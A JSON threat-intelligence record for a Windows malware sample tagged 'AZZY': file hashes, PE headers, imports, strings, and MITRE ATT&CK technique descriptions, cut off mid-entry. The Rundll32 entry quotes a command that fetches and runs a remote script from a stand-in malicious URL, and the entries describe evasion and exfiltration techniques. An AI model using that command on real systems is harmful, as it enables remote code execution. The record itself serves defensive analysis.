{
    "alias": "AZZY", 
    "analysis": {
        "_id": {
            "$oid": "5ba55937ba80ffe26b515aca"
        }, 
        "description": "PE32 executable (GUI) Intel 80386, for MS Windows", 
        "file_id": "6272d6bab3783e8b3b4ac917cd81680bd3ac56ae", 
        "fuzzy_hash": "3072:0K3gJd8Yt+Vvu/5gEsSy8dH0pLaATo4ti6Yp4oQZiEct:fYqvuTD0pLa2o4FYDW4", 
        "hash": {
            "md5": "bb76ff49dbb6c94323ea2235ce3ad746", 
            "sha1": "6272d6bab3783e8b3b4ac917cd81680bd3ac56ae", 
            "sha2": "fb4acedb9ff509041568908faa8839d33f7b0609eece3238b5040658bfe68727"
        }, 
        "mime_type": "application/x-dosexec", 
        "particular_header": {
            "av_analysis": "Not_implemented", 
            "certificate": {}, 
            "child_of": "Not_implemented", 
            "cypher": "Not_implemented", 
            "date": "'0x4E8335FE [SUSPICIOUS]'", 
            "ep": "'0x403eec .text 0/3'", 
            "exports": {}, 
            "file_entropy": 5.680635149945245, 
            "headers": {
                "dos_header": {
                    "cblp": "'0x90'", 
                    "cp": "'0x3'", 
                    "cparhdr": "'0x4'", 
                    "crlc": "'0x0'", 
                    "cs": "'0x0'", 
                    "csum": "'0x0'", 
                    "ip": "'0x0'", 
                    "lfanew": "'0xb8'", 
                    "lfarlc": "'0x40'", 
                    "magic": "'0x5a4d'", 
                    "maxalloc": "'0xffff'", 
                    "minalloc": "'0x0'", 
                    "oemid": "'0x0'", 
                    "oeminfo": "'0x0'", 
                    "ovno": "'0x0'", 
                    "res": "'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'", 
                    "res2": "'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'", 
                    "sp": "'0xb8'", 
                    "ss": "'0x0'"
                }, 
                "file_header": {
                    "Characteristics": "'0x10f'", 
                    "Machine": "'0x14c'", 
                    "NumberOfSections": "'0x3'", 
                    "NumberOfSymbols": "'0x0'", 
                    "PointerToSymbolTable": "'0x0'", 
                    "SizeOfOptionalHeader": "'0xe0'", 
                    "TimeDateStamp": "'0x4e8335fe'"
                }, 
                "nt_header": {
                    "Signature": "'0x4550'"
                }, 
                "optional_header": {
                    "AddressOfEntryPoint": "'0x3eec'", 
                    "BaseOfCode": "'0x1000'", 
                    "CheckSum": "'0x28176'", 
                    "DllCharacteristics": "'0x0'", 
                    "FileAlignment": "'0x1000'", 
                    "ImageBase": "'0x400000'", 
                    "LoaderFlags": "'0x0'", 
                    "Magic": "'0x10b'", 
                    "MajorImageVersion": "'0x1'", 
                    "MajorLinkerVersion": "'0x6'", 
                    "MajorOperatingSystemVersion": "'0x4'", 
                    "MajorSubsystemVersion": "'0x4'", 
                    "MinorImageVersion": "'0x0'", 
                    "MinorLinkerVersion": "'0x0'", 
                    "MinorOperatingSystemVersion": "'0x0'", 
                    "MinorSubsystemVersion": "'0x0'", 
                    "NumberOfRvaAndSizes": "'0x10'", 
                    "Reserved1": "'0x0'", 
                    "SectionAlignment": "'0x1000'", 
                    "SizeOfCode": "'0x20000'", 
                    "SizeOfHeaders": "'0x1000'", 
                    "SizeOfHeapCommit": "'0x1000'", 
                    "SizeOfHeapReserve": "'0x100000'", 
                    "SizeOfImage": "'0x27000'", 
                    "SizeOfInitializedData": "'0x6000'", 
                    "SizeOfStackCommit": "'0x1000'", 
                    "SizeOfStackReserve": "'0x100000'", 
                    "SizeOfUninitializedData": "'0x0'", 
                    "Subsystem": "'0x2'"
                }
            }, 
            "imports": [
                {
                    "functions": [
                        "none", 
                        "'__vbavarsub'", 
                        "'__vbastri2'", 
                        "none", 
                        "none", 
                        "'_cicos'", 
                        "'_adj_fptan'", 
                        "'__vbavarmove'", 
                        "none", 
                        "'__vbastri4'", 
                        "none", 
                        "none", 
                        "'__vbavarvargnofree'", 
                        "none", 
                        "'__vbafreevar'", 
                        "'__vbaarymove'", 
                        "none", 
                        "'__vbastrvarmove'", 
                        "'__vbalenbstr'", 
                        "none", 
                        "'__vbafreevarlist'", 
                        "'__vbaput3'", 
                        "'__vbaend'", 
                        "'_adj_fdiv_m64'", 
                        "'__vbaput4'", 
                        "none", 
                        "none", 
                        "'_adj_fprem1'", 
                        "none", 
                        "'__vbastrcat'", 
                        "'__vbarecdestruct'", 
                        "'__vbasetsystemerror'", 
                        "'__vbahresultcheckobj'", 
                        "'__vbalenbstrb'", 
                        "none", 
                        "'_adj_fdiv_m32'", 
                        "'__vbaaryvar'", 
                        "'__vbaarydestruct'", 
                        "'__vbavarindexloadreflock'", 
                        "none", 
                        "'__vbaonerror'", 
                        "'_adj_fdiv_m16i'", 
                        "'_adj_fdivr_m16i'", 
                        "'__vbavarindexload'", 
                        "none", 
                        "'__vbastrfixstr'", 
                        "none", 
                        "'__vbafpr8'", 
                        "'__vbaboolvarnull'", 
                        "'_cisin'", 
                        "'__vbaerase'", 
                        "none", 
                        "none", 
                        "'__vbavarzero'", 
                        "none", 
                        "'__vbachkstk'", 
                        "'__vbafileclose'", 
                        "none", 
                        "'__vbagenerateboundserror'", 
                        "none", 
                        "'__vbastrcmp'", 
                        "'__vbaget3'", 
                        "'__vbavartsteq'", 
                        "'__vbaaryconstruct2'", 
                        "'__vbaputowner3'", 
                        "'__vbai2i4'", 
                        "'dllfunctioncall'", 
                        "none", 
                        "'__vbafpui1'", 
                        "'__vbaredimpreserve'", 
                        "'_adj_fpatan'", 
                        "'__vbafixstrconstruct'", 
                        "'__vbaredim'", 
                        "'__vbaui1errvar'", 
                        "'__vbaui1i2'", 
                        "'_cisqrt'", 
                        "'__vbavarand'", 
                        "'__vbaui1i4'", 
                        "'__vbafpcmpcy'", 
                        "'__vbavarmul'", 
                        "'__vbaexcepthandler'", 
                        "none", 
                        "none", 
                        "none", 
                        "'_adj_fprem'", 
                        "'_adj_fdivr_m64'", 
                        "none", 
                        "'__vbafpexception'", 
                        "none", 
                        "'__vbainstrvar'", 
                        "'__vbaubound'", 
                        "'__vbastrvarval'", 
                        "'__vbavarcat'", 
                        "'__vbagetowner4'", 
                        "none", 
                        "'__vbai2var'", 
                        "none", 
                        "none", 
                        "none", 
                        "'_cilog'", 
                        "'__vbaerroroverflow'", 
                        "'__vbafileopen'", 
                        "'__vbainstr'", 
                        "none", 
                        "'__vbavar2vec'", 
                        "'__vbanew2'", 
                        "'__vbavarint'", 
                        "'_adj_fdiv_m32i'", 
                        "'_adj_fdivr_m32i'", 
                        "'__vbastrcopy'", 
                        "none", 
                        "'__vbafreestrlist'", 
                        "'__vbavarnot'", 
                        "'__vbaderefary1'", 
                        "'_adj_fdivr_m32'", 
                        "'__vbapowerr8'", 
                        "'_adj_fdiv_r'", 
                        "none", 
                        "'__vbai4var'", 
                        "'__vbaarylock'", 
                        "'__vbavaradd'", 
                        "'__vbavardup'", 
                        "none", 
                        "'__vbafpi2'", 
                        "'__vbavarcopy'", 
                        "none", 
                        "'__vbafpi4'", 
                        "none", 
                        "'_ciatan'", 
                        "'__vbastrmove'", 
                        "none", 
                        "'__vbaarycopy'", 
                        "none", 
                        "'__vbastrvarcopy'", 
                        "'_allmul'", 
                        "'_citan'", 
                        "'__vbaaryunlock'", 
                        "'__vbaui1var'", 
                        "'_ciexp'", 
                        "'__vbamidstmtbstr'", 
                        "'__vbafreestr'", 
                        "'__vbafreeobj'", 
                        "'__vbai4errvar'"
                    ], 
                    "lib": "'msvbvm60.dll'"
                }
            ], 
            "imports_tree": "added", 
            "packer_detection": "Unknown", 
            "packer_version": "Not_implemented", 
            "res_entries": [
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x222c8'", 
                    "sha1": "6b3b07029bb9d52635c7a720f07252acf8f3de4e", 
                    "size": "'0xea8'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x23170'", 
                    "sha1": "3bed365b7349a4e11b12614018c88f47cae32ef4", 
                    "size": "'0xea8'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x24018'", 
                    "sha1": "113e94b1dcf549221f714e7690c89a352e88cfa7", 
                    "size": "'0xea8'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x24ec0'", 
                    "sha1": "1cf1fb59296e105c278350e421c6fe41dc61b5b9", 
                    "size": "'0xea8'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_NEUTRAL'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x25d68'", 
                    "sha1": "ca85fbf532389887f3837bbadd1c579040b99c8b", 
                    "size": "'0x130'", 
                    "sublang": "'SUBLANG_NEUTRAL'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_NEUTRAL'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x25e98'", 
                    "sha1": "4af9a0fe3b7371abc50a18e851f3122fce9a2ffa", 
                    "size": "'0x2e8'", 
                    "sublang": "'SUBLANG_NEUTRAL'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_NEUTRAL'", 
                    "name": "'RT_ICON'", 
                    "rva": "'0x26180'", 
                    "sha1": "f253482c0fa25197130f6475f2ded060527843bf", 
                    "size": "'0x128'", 
                    "sublang": "'SUBLANG_NEUTRAL'", 
                    "type": "'GLS_BINARY_LSB_FIRST'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_STRING'", 
                    "rva": "'0x262a8'", 
                    "sha1": "0d643775dbc6dc2d0bfa0a62f3f2d2f37922718c", 
                    "size": "'0x6a0'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_GROUP_ICON'", 
                    "rva": "'0x26948'", 
                    "sha1": "ac6d82848d44200d90aa649d58061bda73013880", 
                    "size": "'0x14'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'MS Windows icon resource - 1 icon, 48x48'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_GROUP_ICON'", 
                    "rva": "'0x2695c'", 
                    "sha1": "43b952c5583ebfd073350d9b91cf7f79b4652040", 
                    "size": "'0x14'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'MS Windows icon resource - 1 icon, 48x48'"
                }, 
                {
                    "lang": "'LANG_NEUTRAL'", 
                    "name": "'RT_GROUP_ICON'", 
                    "rva": "'0x26970'", 
                    "sha1": "70732dac88537f00c89d105f986ef843d3aca818", 
                    "size": "'0x30'", 
                    "sublang": "'SUBLANG_NEUTRAL'", 
                    "type": "'MS Windows icon resource - 3 icons, 32x32, 2 colors'"
                }, 
                {
                    "lang": "'LANG_ENGLISH'", 
                    "name": "'RT_VERSION'", 
                    "rva": "'0x269a0'", 
                    "sha1": "391495f54992d70adc29029b09da3d364905eded", 
                    "size": "'0x1f8'", 
                    "sublang": "'SUBLANG_ENGLISH_US'", 
                    "type": "'data'"
                }
            ], 
            "sections": [
                {
                    "characteristics": "0x60000020", 
                    "entropy": 5.742364968784358, 
                    "fuzzy_hash": "3072:cK3gJd8Yt+Vvu/5gEsSy8dH0pLaATo4ti6Y:3YqvuTD0pLa2o4FY", 
                    "md5": "5a7d6b9f8b8b8a0acba167abc83abd85", 
                    "name": "'.text\\x00\\x00\\x00'", 
                    "sha1": "2067c40e631b18a0057ebfa68624803ae4f4ee5b", 
                    "sha2": "653a5dd1b3f428ec37ed3e57684ca36bc1b02bd1733dfc92a6037d8c6c9050ad", 
                    "size_raw_data": 131072, 
                    "virtual_size": 127852, 
                    "write_executable": "False"
                }, 
                {
                    "characteristics": "0xc0000040", 
                    "entropy": 0.0, 
                    "fuzzy_hash": "3::", 
                    "md5": "620f0b67a91f7f74151bc5be745b7110", 
                    "name": "'.data\\x00\\x00\\x00'", 
                    "sha1": "1ceaf73df40e531df3bfb26b4fb7cd95fb7bff1d", 
                    "sha2": "ad7facb2586fc6e966c004d7d1d16b024f5805ff7cb47c7a85dabd8b48892ca7", 
                    "size_raw_data": 4096, 
                    "virtual_size": 1592, 
                    "write_executable": "False"
                }, 
                {
                    "characteristics": "0x40000040", 
                    "entropy": 5.866371734534851, 
                    "fuzzy_hash": "384:OJ4SFNrUY822vtkM8GQH2KeObvEsjEmZI8DzGIt:OJ4SDQN22l7hKeXsjEFet", 
                    "md5": "95ac2a6790a52e91fdae514dfb45279d", 
                    "name": "'.rsrc\\x00\\x00\\x00'", 
                    "sha1": "4ce8036012d8ffdd1ba82db7adf5be27d901ca70", 
                    "sha2": "5c938b568f4d6440403126fab11d6cb6977f57c491b0327364b5c5052b348ed3", 
                    "size_raw_data": 20480, 
                    "virtual_size": 19352, 
                    "write_executable": "False"
                }
            ], 
            "strings": {
                "hidden_dll": [
                    "'user32'"
                ], 
                "hidden_imports": [
                    "'callwindowprocw'"
                ], 
                "interesting": [
                    "'vba6.dll'"
                ], 
                "raw_strings": [
                    "'  %<=hn'", 
                    "' jdhxk@'", 
                    "' jhhxk@'", 
                    "' jphxk@'", 
                    "' jxhxk@'", 
                    "'$=hn'", 
                    "'$@df '", 
                    "'%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%'", 
                    "'%.2.b'", 
                    "'()e]'", 
                    "'()ha'", 
                    "')drg'", 
                    "'-/:bl'", 
                    "'-0?l'", 
                    "'-c000-uobyxyjufyoqeeszh'", 
                    "'/95/'", 
                    "'/:8/'", 
                    "'0ehhna'", 
                    "'0vwtthnnpn'", 
                    "'1u  '", 
                    "'22?m'", 
                    "'2525o'", 
                    "'2hhne'", 
                    "'310.('", 
                    "'4ybrm-'", 
                    "'5 -@'", 
                    "'5$-@'", 
                    "'50-@'", 
                    "'522o'", 
                    "'54-@'", 
                    "'5777j'", 
                    "'58-@'", 
                    "'5<-@'", 
                    "'5bstlps%'", 
                    "'5thhhv'", 
                    "'6644'", 
                    "'775o'", 
                    "'8888%'", 
                    "':2/)'", 
                    "'?wtthhv'", 
                    "'@_@&'", 
                    "'@b@$'", 
                    "'@j@$'", 
                    "'@r@$'", 
                    "'@t@&'", 
                    "'@x@$'", 
                    "'@z@&'", 
                    "']cccccc'", 
                    "']wf9'", 
                    "'a/lh'", 
                    "'b2231.-.1.j'", 
                    "'bfww'", 
                    "'bs1hrs'", 
                    "'bwwthnni'", 
                    "'callwindowprocw'", 
                    "'ccqqh'", 
                    "'cqbs'", 
                    "'d@a]]]'", 
                    "'ddcddccedd_k'", 
                    "'dddevv'", 
                    "'dgccgcc]]u'", 
                    "'dsm, '", 
                    "'el]][['", 
                    "'fvvv'", 
                    "'gabkgzmsfwhrdlbayk'", 
                    "'gpsf'", 
                    "'h,l@'", 
                    "'h0d@'", 
                    "'h8k@'", 
                    "'h8ua'", 
                    "'h9aa'", 
                    "'h<qa'", 
                    "'h@g@'", 
                    "'hbeu'", 
                    "'hg]a'", 
                    "'hhk@'", 
                    "'hhooo'", 
                    "'hioa'", 
                    "'hkaa'", 
                    "'hnnjn'", 
                    "'hpl@'", 
                    "'hpsoopsbrrs>ups'", 
                    "'hpsp'", 
                    "'hx?a'", 
                    "'hxg@'", 
                    "'hxk@'", 
                    "'hxl@'", 
                    "'hz8a'", 
                    "'i10?i'", 
                    "'i?0$'", 
                    "'iheefiow'", 
                    "'iudf'", 
                    "'iyyyyy'", 
                    "'jb_j'", 
                    "'jjml@lil'", 
                    "'jps/'", 
                    "'jpsi'", 
                    "'jrsm'", 
                    "'jsizzy4%'", 
                    "'khejafw'", 
                    "'khqqjrep1'", 
                    "'kigm'", 
                    "'kpspurs'", 
                    "'kut8'", 
                    "'l)j.1'", 
                    "'loaafl'", 
                    "'lpsh'", 
                    "'lvwut'", 
                    "'lvwww'", 
                    "'mabik'", 
                    "'mbtsr'", 
                    "'mbuut'", 
                    "'n>>aa[['", 
                    "'ncb='", 
                    "'nnn7'", 
                    "'npsx'", 
                    "'nrssnps'", 
                    "'odljofww'", 
                    "'ompmqqq'", 
                    "'oopo'", 
                    "'os&nps'", 
                    "'os4urs'", 
                    "'osblps'", 
                    "'osejpsd'", 
                    "'osetps'", 
                    "'osflps'", 
                    "'osmlps'", 
                    "'osxlpsq'", 
                    "'osyurs'", 
                    "'paddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingxxpaddingpaddingx'", 
                    "'ph$l@'", 
                    "'phhg@'", 
                    "'phhl@'", 
                    "'phpg@'", 
                    "'phpl@'", 
                    "'phxg@'", 
                    "'phxl@'", 
                    "'poqqq'", 
                    "'pottt'", 
                    "'pqcew'", 
                    "'pql=8.%'", 
                    "'ps2vrs'", 
                    "'psdrosk'", 
                    "'psfzps0jps'", 
                    "'qmpmqqq'", 
                    "'qrs.'", 
                    "'qs@9rsj'", 
                    "'qstjps'", 
                    "'qswups'", 
                    "'qyejpoce'", 
                    "'rkkk'", 
                    "'rrrsz'", 
                    "'sgyyx6,%'", 
                    "'tf)-ji[-_'", 
                    "'tjujhvvpkibqtbjv'", 
                    "'tsf%'", 
                    "'ttttzzz'", 
                    "'u3za'", 
                    "'uigd%'", 
                    "'uobyxyjufyoqeeszh'", 
                    "'upse'", 
                    "'urs-'", 
                    "'user32'", 
                    "'uuur'", 
                    "'vba6.dll'", 
                    "'vrs$fps'", 
                    "'vvooo'", 
                    "'vwwwr'", 
                    "'wawpnhh'", 
                    "'wrsd'", 
                    "'wrsz'", 
                    "'wvvl'", 
                    "'xdwv'", 
                    "'xfhjb'", 
                    "'xn>n'", 
                    "'xnfa'", 
                    "'xxhl'", 
                    "'xyyy'", 
                    "'yqid0%'", 
                    "'yzwd'", 
                    "'zxwooml>k%'"
                ]
            }, 
            "version": {
                "fixed_file_info": {
                    "FileDateLS": "'0x0'", 
                    "FileDateMS": "'0x0'", 
                    "FileFlags": "'0x0'", 
                    "FileFlagsMask": "'0x0'", 
                    "FileOS": "'0x4'", 
                    "FileSubtype": "'0x0'", 
                    "FileType": "'0x1'", 
                    "FileVersionLS": "'0x0'", 
                    "FileVersionMS": "'0x10000'", 
                    "ProductVersionLS": "'0x0'", 
                    "ProductVersionMS": "'0x10000'", 
                    "Signature": "'0xfeef04bd'", 
                    "StrucVersion": "'0x10000'"
                }, 
                "string_file_info": {
                    "Comments": "None", 
                    "CompanyName": "None", 
                    "FileDescription": "None", 
                    "FileVersion": "1.00", 
                    "InternalName": "qYeJpoCE", 
                    "LangID": "040904B0", 
                    "LegalCopyright": "None", 
                    "LegalTrademarks": "None", 
                    "OriginalFilename": "qYeJpoCE.exe", 
                    "PrivateBuild": "None", 
                    "ProductName": "gaBkGZMSFWHRdLbaYK", 
                    "ProductVersion": "1.00", 
                    "SpecialBuild": "None"
                }, 
                "version_info": {
                    "Length": "'0x1f8'", 
                    "Type": "'0x0'", 
                    "ValueLength": "'0x34'"
                }
            }
        }, 
        "size": 159744
    }, 
    "attack-pattern": [
        {
            "created": "2017-05-31T21:31:28.471Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Windows\n\nPermissions Required: User, Administrator, SYSTEM", 
            "external_references": [
                {
                    "external_id": "T1120", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1120"
                }
            ], 
            "id": "attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "discovery"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Peripheral Device Discovery", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:56.776Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.\n\nDetection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used. (Citation: University of Birmingham C2)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring\n\nRequires Network: Yes", 
            "external_references": [
                {
                    "external_id": "T1071", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1071"
                }, 
                {
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.", 
                    "source_name": "University of Birmingham C2", 
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ], 
            "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "command-and-control"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Standard Application Layer Protocol", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Packet capture", 
                "Netflow/Enclave netflow", 
                "Process use of network", 
                "Malware reverse engineering", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:06.045Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nDetection: Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.\n\nPlatforms: Windows\n\nData Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring\n\nDefense Bypassed: Anti-virus, Application whitelisting\n\nPermissions Required: User\n\nRemote Support: No\n\nContributors: Ricardo Dias, Casey Smith", 
            "external_references": [
                {
                    "external_id": "T1085", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1085"
                }, 
                {
                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.", 
                    "source_name": "Trend Micro CPL", 
                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
                }, 
                {
                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.", 
                    "source_name": "This is Security Command Line Confusion", 
                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/"
                }
            ], 
            "id": "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "defense-evasion"
                }, 
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "execution"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Rundll32", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Ricardo Dias", 
                "Casey Smith"
            ], 
            "x_mitre_data_sources": [
                "File monitoring", 
                "Binary file metadata", 
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_defense_bypassed": [
                "Anti-virus", 
                "Application whitelisting"
            ], 
            "x_mitre_permissions_required": [
                "User"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ], 
            "x_mitre_remote_support": false
        }, 
        {
            "created": "2017-05-31T21:30:41.804Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Data exfiltration is performed over the Command and Control channel.  Data is encoded into the normal communications channel using the same protocol as command and control communications.\n\nDetection: Detection for command and control applies. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: User interface, Process monitoring\n\nRequires Network: Yes", 
            "external_references": [
                {
                    "external_id": "T1041", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1041"
                }, 
                {
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.", 
                    "source_name": "University of Birmingham C2", 
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ], 
            "id": "attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "exfiltration"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Exfiltration Over Command and Control Channel", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "User interface", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:33.979Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "The  (Citation: Microsoft Component Object Model) (COM) is a system within Windows to enable interaction between software components through the operating system. (Citation: Microsoft Component Object Model) Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. (Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.\n\nDetection: There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations replacing know binary paths with unknown paths. Even though some third party applications define user COM objects, the presence of objects within 